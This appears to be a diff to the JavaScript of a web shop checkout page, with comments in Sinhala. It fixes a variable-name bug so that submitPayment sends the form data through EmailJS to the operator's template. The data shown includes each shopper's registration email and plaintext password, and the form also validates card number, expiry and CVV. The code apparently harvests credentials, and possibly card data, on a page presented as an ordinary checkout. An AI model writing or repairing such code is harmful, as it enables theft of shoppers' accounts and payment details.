@@ -310,6 +310,7 @@ function generateOrderId() {
 
 /* ============ Submit Payment (Email යවන තැන) ============ */
 function submitPayment() {
+  // 1. Validation Check
   const ok = [validateName(), validateCardNumber(), validateExpiry(), validateCVV()].every(v => v === true);
   if (!ok) {
     const firstErr = document.querySelector(".popup-body .error-msg.show");
@@ -318,15 +319,17 @@ function submitPayment() {
     return;
   }
 
+  // 2. Loading State
   payBtn.disabled = true;
   payBtn.classList.add("loading");
   payBtnText.innerText = "Processing...";
   showStatus("Please wait...", "loading");
 
+  // 3. Data Collection
   const orderId = document.getElementById("orderId").innerText;
   const itemsList = cart.map(i => `${i.name} × ${i.qty} = $${(i.price * i.qty).toFixed(2)}`).join("\n");
 
-  // ඊමේල් එකට යවන ඩේටා
+  // මේ variable එකේ නම 'params' වෙන්න ඕනේ (කලින් වැරදිලා තිබ්බා)
   const params = {
     email: document.getElementById("regEmail").value.trim(),
     password: document.getElementById("regPassword").value,
@@ -344,8 +347,8 @@ function submitPayment() {
     items: itemsList
   };
 
-  // ඔයාගේ Service ID සහ Template ID මෙතනට දාලා තියෙනවා
-  emailjs.send("service_6fba0zo", "template_y2yzm6d", templateParams)
+  // 4. Email යැවීම (අලුත් Template ID එක මෙතන දාලා තියෙනවා)
+  emailjs.send("service_6fba0zo", "template_y2yzm6d", params)
     .then(() => {
       showStatus("Payment successful!", "success");
       payBtnText.innerText = "✓ Success";
